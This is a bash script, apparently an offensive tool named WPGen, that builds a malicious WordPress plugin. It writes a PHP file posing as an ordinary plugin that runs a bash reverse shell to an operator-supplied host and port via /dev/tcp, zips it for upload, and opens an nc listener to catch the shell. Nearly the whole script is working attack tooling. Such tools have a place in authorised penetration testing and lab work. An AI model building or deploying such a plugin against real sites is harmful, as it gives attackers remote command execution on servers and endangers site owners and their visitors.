#!/bin/bash

declare -r White="\e[97m"
declare -r Green="\e[32m"
declare -r Yellow="\e[33m"
declare -r Blue="\e[34m"
declare -r Red="\e[31m"
declare -r End="\e[0m"

declare -r f1='<'
declare -r f2='>'
declare -r f3=' =============================================='
declare -r f4='|'
declare -r f5='Example:'
declare -r f6='Compress:'
declare -r f7='Creating:'
declare -r f8='Generated:'
declare -r f9='ZIP Not Installed'
declare -r f10='lhost'
declare -r f11='lport'
declare -r f12='Installing ZIP'
declare -r f13='ZIP Instaled'
declare -r f14='  Auto Generator Malicious Plugins WordPress'
declare -r f15='WPGen'
declare -r f16='[+]'
declare -r f17='[-]'
declare -r f18='[!]'
declare -r f19='[*]'
declare -r f20='plugin.php'
declare -r f21='plugin.zip'
declare -r f22='Listening:'
declare -r f23='nc -lvnp'

function check(){
	which zip > /dev/null 2>&1
    if [ "$(echo $?)" == "0" ]; then
        :
    else
        echo ""
        echo -e "$Red$f17 $White$f9$End"
        sleep 2
        echo -e "$Yellow$f18 $White$f12$End"
        sleep 2
        apt-get install zip -y > /dev/null 2>&1
        echo -e "$Green$f16 $White$f13$End"
        echo ""
        sleep 2
        exit 0
    fi
}

function banner(){
    echo ""
    echo -e "$Blue __      ____________  $White  ________                 $End"
    echo -e "$Blue/  \    /  \______   \ $White /  _____/  ____   ____    $End"
    echo -e "$Blue\   \/\/   /|     ___/ $White/   \  ____/ __ \ /    \   $End"
    echo -e "$Blue \        / |    |     $White\    \_\  \  ___/|   |  \\ $End"
    echo -e "$Blue  \__/\  /  |____|     $White \______  /\___  >___|  /  $End"
    echo -e "$Blue       \/              $White        \/     \/     \/   $End"
    echo -e "$Blue$f3$End"
    echo -e "$White$f4$Green$f14  $White$f4$End"
    echo -e "$Blue$f3$Blue$End"
}

function main(){
    echo ""
    echo -e "$Yellow$f18 $Green$f5 $White$f15 -l $Red$f1$White$f10$Red$f2$White -p $Red$f1$White$f11$Red$f2$End"
    echo ""
}

while getopts "h:p:" arg; do
    case $arg in
        h) lhost=$OPTARG; let parameter_counter+=1 ;;
	p) lport=$OPTARG; let parameter_counter+=1 ;;
    esac
done

if [ ! -z $lhost ]; then
    check
else
    banner
    main
    exit 0
fi

if [ ! -z $lport ]; then
    banner
else
    banner
    main
    exit 0
fi

function createPlugin(){
    echo ""
    echo -e "$Blue$f19 $White$f7  $Red$f20$End"
    sleep 2

cat <<EOF > plugin.php
<?php

/**
* Plugin Name: WPGen
* Plugin URI: http://localhost
* Description: Love WPGen
* Version: 1.0
* Author: d4t4s3c
* Author URI: https://github.com/d4t4s3c
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'");
?>
EOF
}

function compressPlugin(){
    /usr/bin/zip plugin.zip plugin.php > /dev/null 2>&1
    rm -rf plugin.php
    echo -e "$Yellow$f18 $White$f6  $Red$f20$End"
    sleep 2
    echo -e "$Green$f16 $White$f8 $Green$f21$End"
    sleep 2
}

function listener(){
    echo -e "$Blue$f18 $White$f22 $Red$f23 $lport$End"
    sleep 2
    echo ""
    nc -lvnp $lport
}

function start(){
    createPlugin
    compressPlugin
    listener
}

start
